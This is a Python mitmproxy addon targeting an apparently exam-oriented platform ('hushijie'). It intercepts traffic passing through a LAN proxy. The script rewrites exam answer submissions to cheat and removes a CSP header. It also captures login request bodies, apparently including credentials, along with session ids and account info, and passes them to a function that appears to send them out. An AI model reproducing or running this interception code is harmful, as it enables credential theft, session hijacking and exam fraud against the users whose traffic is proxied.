#！/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
import json
import urllib
from m2m import e2e
import mitmproxy.http
from mitmproxy import ctx
from server import parser_login
from comm import path0,modify_answer,match_answer,match_score,getip
class Hsj_Addon:
    def __init__(self):
        self.num = 0
        self.id=''
        self.flag=''
        self.response_path=''
        self.request_path=''
        self.answer_lst=None
        self.no=None
        self.txt=None
    def response(self, flow:mitmproxy.http.HTTPFlow):
        print('==================flow.request.text==========================')
        print(flow.request.text)
        print('==================flow.request.content=======================')
        print(flow.request.content)
        if self.flag=='start':
            self.response_path=path0+'start_response.txt'
            if (self.id is not '') and (flow.id == self.id):
                text=flow.response.get_text()
                with open(self.response_path,mode='w',encoding='utf-8') as f:
                    f.write(text)
                print('%s已保存'%self.response_path)
                self.answer_lst,yes,so,no,score_lst=match_answer()
                self.no=no
                self.answer_lst=match_score(self.answer_lst,yes,so,no,score_lst)
                self.id=''
                self.flag=''
        if self.flag=='commit':
            self.response_path=path0+'commit_response.txt'
            if (self.id is not '') and (flow.id == self.id):
                text=flow.response.get_text()
                with open(self.response_path,mode='w',encoding='utf-8') as f:
                    f.write(text)
                print('%s已保存'%self.response_path)
                self.id=''
                self.flag=''
        if self.flag=='login':
            if (self.id is not '') and (flow.id == self.id):
                text=flow.response.get_text()
                j=json.loads(text)
                if j["ret"]==1:
                    sessionid=j["sessionid"]
                    info=parser_login(j['account'])
                    st='\n'.join(self.txt.split(sep='&'))
                    print('%s\n%s\n%s'%(st,info,sessionid))
                    e2e('hushijie_info','%s\n%s\n%s'%(st,info,sessionid))
                    self.txt=None
                self.id=''
                self.flag=''
    def request(self, flow: mitmproxy.http.HTTPFlow):
        if (('hushijie' in flow.request.host) and
            ('answer/start' in flow.request.path)):
            self.id=flow.id
            self.flag='start'
            print('提交考试请求')
        if (('hushijie' in flow.request.host) and
            ('answer/commit' in flow.request.path) and
            (flow.request.method=='POST')):
            print('正在提交考试数据……')
            self.id=flow.id
            self.flag='commit'
            self.request_path=path0+'commit_request.txt'
            text=urllib.parse.unquote(flow.request.text)
            with open(self.request_path,mode='w',encoding='utf-8') as f:
                f.write(text)
            print('%s已保存'%self.request_path)
            modified_text=modify_answer(default_answer=self.answer_lst,no=self.no)
            if 'CSP' in flow.request.headers:flow.request.headers.pop('CSP')
            dic=dict([(k, v[0]) for k, v in urllib.parse.parse_qs(modified_text).items()])
            modify_content=urllib.parse.urlencode(dic).encode()
            flow.request.content=modify_content
            self.answer_lst=None
            self.no=None
        if (('hushijie' in flow.request.host) and
            ('account/app/login' in flow.request.path) and
            (flow.request.method=='POST')):
            self.id=flow.id
            self.flag='login'
            text=urllib.parse.unquote(flow.request.text)
            self.txt=text
ctx.log.info('局域网IP：{ip}'.format(ip=getip()))
addons = [Hsj_Addon(),]